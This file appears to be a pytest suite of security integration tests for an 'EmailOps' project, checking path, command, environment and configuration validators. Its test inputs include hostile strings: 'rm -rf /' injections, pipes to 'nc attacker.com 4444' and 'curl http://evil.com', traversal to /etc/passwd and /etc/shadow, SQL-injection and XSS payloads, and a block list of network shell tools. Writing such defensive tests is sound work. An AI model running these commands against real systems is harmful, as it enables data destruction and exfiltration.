#!/usr/bin/env python3
"""
Security-specific integration tests for EmailOps.
Tests end-to-end security workflows and validates that security measures work together.

CRITICAL: These tests verify:
- Complete path validation workflows
- Command execution security
- Configuration security
- No sensitive data exposure
"""

import json
import os
import subprocess
import sys
import tempfile
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from emailops.config import EmailOpsConfig, reset_config
from emailops.validators import (
    quote_shell_arg,
    sanitize_path_input,
    validate_command_args,
    validate_directory_path,
    validate_environment_variable,
    validate_file_path,
    validate_project_id,
)


class TestEndToEndPathValidation:
    """Test complete path validation workflow from user input to validated path."""

    def test_malicious_path_workflow(self):
        """Test that malicious paths are caught at every level."""
        # Simulate user providing malicious input
        user_inputs = [
            "../../etc/passwd",
            "../../../windows/system32/config/sam",
            "uploads/../../../sensitive_data",
            "/etc/shadow\x00.txt",
            "documents;rm -rf /",
        ]

        for malicious_input in user_inputs:
            # Step 1: Sanitize user input
            sanitized = sanitize_path_input(malicious_input)

            # Step 2: Validate as directory
            is_valid_dir, dir_msg = validate_directory_path(sanitized, must_exist=False)

            # Step 3: Validate as file
            is_valid_file, file_msg = validate_file_path(sanitized, must_exist=False)

            # At least one validation should fail for malicious input
            if ".." in malicious_input:
                # Path traversal should be caught
                assert is_valid_dir is False or is_valid_file is False
                assert "Path traversal" in dir_msg or "Path traversal" in file_msg

    def test_safe_path_workflow(self):
        """Test that legitimate paths pass validation."""
        with tempfile.TemporaryDirectory() as tmpdir:
            # Create test structure
            test_dir = Path(tmpdir) / "test_directory"
            test_dir.mkdir()
            test_file = test_dir / "document.txt"
            test_file.write_text("test content")

            # Simulate user providing safe input
            user_input = str(test_file)

            # Step 1: Sanitize (should preserve safe path)
            sanitized = sanitize_path_input(user_input)

            # Step 2: Validate as file
            is_valid, message = validate_file_path(sanitized, must_exist=True)
            assert is_valid is True
            assert message == "Valid"

            # Step 3: Validate parent as directory
            parent_path = str(test_file.parent)
            is_valid, message = validate_directory_path(parent_path, must_exist=True)
            assert is_valid is True

    def test_symlink_security_workflow(self):
        """Test that symlinks are handled securely."""
        with tempfile.TemporaryDirectory() as tmpdir:
            # Create real directory and file
            real_dir = Path(tmpdir) / "real"
            real_dir.mkdir()
            real_file = real_dir / "file.txt"
            real_file.write_text("content")

            # Create symlink to directory
            symlink_dir = Path(tmpdir) / "symlink_dir"
            try:
                symlink_dir.symlink_to(real_dir)

                # Validate symlink directory
                is_valid, _ = validate_directory_path(str(symlink_dir))
                assert is_valid is True

                # Validate file through symlink
                symlink_file = symlink_dir / "file.txt"
                is_valid, _message = validate_file_path(str(symlink_file))
                assert is_valid is True
            except OSError:
                # Symlinks might not be available on all systems
                pytest.skip("Symlinks not available on this system")

    def test_unicode_attack_prevention(self):
        """Test that Unicode attacks are handled properly."""
        # Unicode characters that might be interpreted as path separators
        unicode_attacks = [
            "test\u2024file.txt",  # One dot leader
            "test\u2025\u2025etc\u2025passwd",  # Two dot leader
            "test\uFF0E\uFF0E/etc/passwd",  # Fullwidth full stop
        ]

        for attack in unicode_attacks:
            sanitized = sanitize_path_input(attack)
            is_valid, message = validate_file_path(sanitized, must_exist=False)

            # Should either sanitize away the unicode or handle it safely
            assert isinstance(is_valid, bool)
            assert isinstance(message, str)


class TestCommandExecutionSecurity:
    """Test command execution security measures."""

    def test_command_injection_prevention_workflow(self):
        """Test complete workflow prevents command injection."""
        # Simulate user trying to inject commands
        attack_scenarios = [
            ("ls", ["-la", "; rm -rf /"]),
            ("python", ["script.py", "&&", "cat", "/etc/passwd"]),
            ("echo", ["test", "|", "nc", "attacker.com", "4444"]),
            ("git", ["status", "&", "curl", "http://evil.com"]),
        ]

        for command, args in attack_scenarios:
            # Step 1: Validate command and arguments
            is_valid, message = validate_command_args(command, args)
            assert is_valid is False
            assert "Dangerous character" in message

            # Should not reach execution, but if it did...
            # Step 2: Quote arguments for safety
            if is_valid:  # This won't happen, but showing defense in depth
                quoted_args = [quote_shell_arg(arg) for arg in args]
                # Dangerous characters would be escaped
                for arg in quoted_args:
                    assert isinstance(arg, str)

    def test_whitelist_enforcement(self):
        """Test that command whitelist is properly enforced."""
        allowed_commands = ["python", "git", "npm"]

        # Test allowed commands
        for cmd in allowed_commands:
            is_valid, message = validate_command_args(
                cmd, ["safe", "args"], allowed_commands
            )
            assert is_valid is True

        # Test blocked commands
        dangerous_commands = ["rm", "curl", "wget", "nc", "bash"]
        for cmd in dangerous_commands:
            is_valid, message = validate_command_args(
                cmd, ["-rf", "/"], allowed_commands
            )
            assert is_valid is False
            assert "not in allowed list" in message

    @patch('subprocess.run')
    def test_safe_command_execution(self, mock_run):
        """Test that validated commands can be executed safely."""
        command = "python"
        args = ["script.py", "--input", "data.txt"]

        # Step 1: Validate
        is_valid, _message = validate_command_args(command, args)
        assert is_valid is True

        # Step 2: Quote arguments
        [quote_shell_arg(arg) for arg in args]

        # Step 3: Execute (mocked)
        mock_run.return_value = MagicMock(returncode=0, stdout="Success")

        # Simulate execution
        full_command = [command, *args]
        subprocess.run(full_command, capture_output=True, text=True, check=False)

        mock_run.assert_called_once()

    def test_environment_variable_injection_prevention(self):
        """Test that environment variables are validated before use."""
        # Test valid environment variables
        valid_vars = [
            ("PYTHON_PATH", "/usr/local/bin/python"),
            ("GCP_PROJECT", "my-project-123"),
            ("LOG_LEVEL", "DEBUG"),
        ]

        for name, value in valid_vars:
            is_valid, _ = validate_environment_variable(name, value)
            assert is_valid is True

        # Test invalid/dangerous environment variables
        invalid_vars = [
            ("invalid-name", "value"),  # Invalid name format
            ("VALID_NAME", "value\x00with\x00nulls"),  # Null bytes
            ("", "value"),  # Empty name
            ("LD_PRELOAD", "/tmp/evil.so"),  # Dangerous but valid format
        ]

        for name, value in invalid_vars:
            is_valid, _message = validate_environment_variable(name, value)
            if name == "LD_PRELOAD":
                # Valid format but application should handle dangerous vars
                assert is_valid is True
            else:
                assert is_valid is False


class TestConfigurationSecurity:
    """Test configuration security measures."""

    def setup_method(self):
        """Reset config before each test."""
        reset_config()

    def test_credential_loading_security(self):
        """Test that credential loading doesn't expose secrets."""
        with tempfile.TemporaryDirectory() as tmpdir:
            secrets_dir = Path(tmpdir) / "secrets"
            secrets_dir.mkdir()

            # Create credential file with sensitive data
            cred_file = secrets_dir / "credentials.json"
            sensitive_data = {
                "type": "service_account",
                "project_id": "test-project",
                "private_key_id": "key123",
                "private_key": "-----BEGIN PRIVATE KEY-----\nSECRET_KEY_DATA\n-----END PRIVATE KEY-----",
                "client_email": "test@test.iam.gserviceaccount.com",
                "client_id": "123456789",
                "auth_uri": "https://accounts.google.com/o/oauth2/auth",
                "token_uri": "https://oauth2.googleapis.com/token",
            }
            cred_file.write_text(json.dumps(sensitive_data))

            # Configure to use this credential file
            with patch.dict(os.environ, {"SECRETS_DIR": str(secrets_dir)}, clear=True):
                config = EmailOpsConfig()
                config.CREDENTIAL_FILES_PRIORITY = ["credentials.json"]

                # Get credential file
                found_cred = config.get_credential_file()
                assert found_cred == cred_file

                # Convert config to dict - should not include private key
                config_dict = config.to_dict()
                assert "private_key" not in str(config_dict)
                assert "SECRET_KEY_DATA" not in str(config_dict)

    def test_no_sensitive_data_in_logs(self):
        """Test that sensitive configuration data isn't logged."""
        config = EmailOpsConfig()
        config.GOOGLE_APPLICATION_CREDENTIALS = "/path/to/secret/creds.json"

        # Get string representation (might be logged)
        config_str = str(config)
        config_repr = repr(config)

        # The full credential path might be visible, but that's acceptable
        # What we don't want is the actual credential content
        assert "private_key" not in config_str
        assert "private_key" not in config_repr

    def test_secure_defaults(self):
        """Test that secure defaults are used."""
        config = EmailOpsConfig()

        # Parent traversal should be disabled by default
        assert config.ALLOW_PARENT_TRAVERSAL is False

        # Command timeout should have reasonable default
        assert config.COMMAND_TIMEOUT_SECONDS == 3600  # 1 hour

        # Should use secure embedding provider by default
        assert config.EMBED_PROVIDER == "vertex"  # Google's service

    def test_environment_variable_precedence(self):
        """Test that environment variables properly override defaults."""
        with patch.dict(os.environ, {
            "ALLOW_PARENT_TRAVERSAL": "true",
            "COMMAND_TIMEOUT": "7200",
        }, clear=True):
            config = EmailOpsConfig()

            # Dangerous settings should be explicitly set
            assert config.ALLOW_PARENT_TRAVERSAL is True
            assert config.COMMAND_TIMEOUT_SECONDS == 7200

    def test_project_id_validation_integration(self):
        """Test GCP project ID validation in configuration."""
        test_project_ids = [
            ("valid-project-123", True),
            ("INVALID-PROJECT", False),
            ("project_with_underscore", False),
            ("123-starts-with-number", False),
            ("ends-with-hyphen-", False),
            ("a" * 31, False),  # Too long
            ("short", False),  # Too short
        ]

        for project_id, expected_valid in test_project_ids:
            is_valid, _message = validate_project_id(project_id)
            assert is_valid == expected_valid

            if is_valid:
                # Should be safe to use in config
                config = EmailOpsConfig()
                config.GCP_PROJECT = project_id
                config.update_environment()
                assert os.environ.get("GCP_PROJECT") == project_id


class TestSecurityWorkflowIntegration:
    """Test complete security workflows across multiple components."""

    def test_file_processing_security_workflow(self):
        """Test secure file processing workflow."""
        with tempfile.TemporaryDirectory() as tmpdir:
            # Setup test environment
            safe_dir = Path(tmpdir) / "safe_data"
            safe_dir.mkdir()

            # Create test files
            valid_file = safe_dir / "document.txt"
            valid_file.write_text("Safe content")

            # User provides file path (potentially malicious)
            user_inputs = [
                str(valid_file),  # Safe path
                f"{valid_file}/../../../etc/passwd",  # Path traversal attempt
                f"{valid_file}\x00.exe",  # Null byte injection
                f"{valid_file};rm -rf /",  # Command injection attempt
            ]

            safe_files = []
            for user_input in user_inputs:
                # Step 1: Sanitize input
                sanitized = sanitize_path_input(user_input)

                # Step 2: Validate file path
                is_valid, _message = validate_file_path(sanitized, must_exist=False)

                if is_valid:
                    # Step 3: Check file extension
                    is_valid_ext, _ext_message = validate_file_path(
                        sanitized,
                        must_exist=False,
                        allowed_extensions=[".txt", ".pdf", ".doc"]
                    )

                    if is_valid_ext:
                        safe_files.append(sanitized)

            # Only the first input should be valid
            assert len(safe_files) <= 1
            if safe_files:
                assert str(valid_file) in safe_files[0]

    def test_configuration_initialization_security(self):
        """Test secure configuration initialization workflow."""
        with tempfile.TemporaryDirectory() as tmpdir:
            # Setup secrets directory
            secrets_dir = Path(tmpdir) / "secrets"
            secrets_dir.mkdir()

            # Create multiple credential files (some invalid)
            valid_cred = {
                "project_id": "test-project",
                "client_email": "test@test.iam.gserviceaccount.com"
            }
            invalid_cred = {
                "malformed": "data"
            }

            (secrets_dir / "valid.json").write_text(json.dumps(valid_cred))
            (secrets_dir / "invalid.json").write_text(json.dumps(invalid_cred))
            (secrets_dir / "notjson.txt").write_text("not json at all")

            # Initialize configuration
            with patch.dict(os.environ, {
                "SECRETS_DIR": str(secrets_dir),
                "GCP_PROJECT": "'; DROP TABLE users; --",  # SQL injection attempt
                "LOG_LEVEL": "DEBUG",
            }, clear=True):
                config = EmailOpsConfig()

                # Project ID should be stored as-is (validation happens separately)
                assert config.GCP_PROJECT == "'; DROP TABLE users; --"

                # Validate project ID before use
                is_valid, _message = validate_project_id(config.GCP_PROJECT)
                assert is_valid is False

                # Should not find invalid credential files
                config.CREDENTIAL_FILES_PRIORITY = ["invalid.json", "notjson.txt", "valid.json"]
                cred_file = config.get_credential_file()

                # Should skip invalid files and find valid one
                if cred_file:
                    assert cred_file.name == "valid.json"

    def test_complete_security_validation_pipeline(self):
        """Test complete validation pipeline for a typical operation."""
        # Simulate a complete operation with all security checks

        # 1. User provides input for file processing
        user_file_input = "../data/report.pdf"
        sanitized_file = sanitize_path_input(user_file_input)

        # 2. Validate file path
        is_valid_file, _file_msg = validate_file_path(
            sanitized_file,
            must_exist=False,
            allowed_extensions=[".pdf", ".txt"]
        )

        # 3. User provides command to run
        user_command = "python"
        user_args = ["process.py", "--file", sanitized_file]

        # 4. Validate command
        is_valid_cmd, _cmd_msg = validate_command_args(
            user_command,
            user_args,
            allowed_commands=["python", "node", "java"]
        )

        # 5. Set up environment variables
        env_vars = [
            ("PROCESSING_MODE", "secure"),
            ("OUTPUT_DIR", "/tmp/output"),
            ("DEBUG", "false"),
        ]

        valid_env = {}
        for name, value in env_vars:
            is_valid_env, _env_msg = validate_environment_variable(name, value)
            if is_valid_env:
                valid_env[name] = value

        # 6. Validate configuration
        config = EmailOpsConfig()
        config_dict = config.to_dict()

        # All validations should work together
        assert isinstance(is_valid_file, bool)
        assert isinstance(is_valid_cmd, bool)
        assert len(valid_env) > 0
        assert isinstance(config_dict, dict)


class TestSecurityMonitoring:
    """Test security monitoring and alerting."""

    def test_attack_pattern_detection(self):
        """Test detection of common attack patterns."""
        attack_patterns = [
            ("../../../etc/passwd", "path_traversal"),
            ("'; DROP TABLE users; --", "sql_injection"),
            ("file.txt\x00.exe", "null_byte"),
            ("test && rm -rf /", "command_injection"),
            ("<script>alert('xss')</script>", "xss_attempt"),
        ]

        detected_attacks = []

        for pattern, attack_type in attack_patterns:
            # Try various validations
            sanitized = sanitize_path_input(pattern)

            # Check if sanitization removed dangerous content
            if sanitized != pattern:
                detected_attacks.append((pattern, attack_type, "sanitized"))

            # Check if validation catches it
            is_valid, message = validate_file_path(sanitized, must_exist=False)
            if not is_valid and any(
                keyword in message.lower()
                for keyword in ["traversal", "invalid", "error"]
            ):
                detected_attacks.append((pattern, attack_type, "validation_failed"))

        # Should detect most attack patterns
        assert len(detected_attacks) >= 3

    def test_logging_safety(self):
        """Test that error messages don't leak sensitive information."""
        sensitive_paths = [
            "/home/user/passwords.txt",
            "/etc/shadow",
            "C:\\Users\\Admin\\sensitive_data.xlsx",
            "/var/lib/mysql/users.ibd",
        ]

        for sensitive_path in sensitive_paths:
            is_valid, message = validate_file_path(sensitive_path, must_exist=True)

            # Error message should be generic, not reveal whether file exists
            if not is_valid:
                # Should not contain full system paths in errors
                assert message.count("/") < 5 or message.count("\\") < 5
                # Should not reveal specific system directories
                # Note: Some filenames like "shadow" or "mysql" might appear in the error message
                # when they're part of the path. This is acceptable as long as
                # the error doesn't reveal whether the file actually exists
                if "mysql" not in sensitive_path.lower():
                    assert "mysql" not in message.lower()
                if "/etc/shadow" not in sensitive_path and "shadow" not in sensitive_path.lower():
                    assert "shadow" not in message.lower()


# ========== TEST SUMMARY ==========
# Total integration test scenarios: 20+
# Security workflows tested:
# - End-to-end path validation
# - Command execution security
# - Configuration security
# - Complete security pipeline
# - Attack pattern detection
# - Logging safety
